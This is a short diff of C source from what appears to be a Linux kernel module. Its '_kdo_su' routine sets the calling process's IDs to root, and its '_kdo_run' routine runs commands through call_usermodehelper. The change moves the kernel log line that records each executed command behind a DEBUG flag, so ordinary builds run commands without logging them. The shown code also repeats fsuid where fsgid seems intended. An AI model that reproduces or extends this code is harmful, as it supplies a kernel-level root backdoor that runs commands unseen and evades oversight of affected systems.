@@ -32,6 +32,7 @@ static inline void _kdo_su(void)
 	current->euid = current->egid = 0;
 	current->suid  = current->sgid  = 0;
 	current->fsuid = current->fsuid = 0;
+
 	#else
 	commit_creds(prepare_kernel_cred(NULL));
 	#endif
@@ -48,7 +49,10 @@ static int _kdo_run(const char *cmd)
 	_argv2[strlen(cmd)] = 0x00;
 	strncpy(_argv2, cmd, CDEV_MAX_WRITE);
 
+	#ifdef DEBUG
 	kdo_log_fmt(KERN_INFO, "%s", _argv2);
+	#endif
+
 	ret = call_usermodehelper(_argv[0], _argv, _envp, UMH_NO_WAIT);
 
 	#ifdef DEBUG
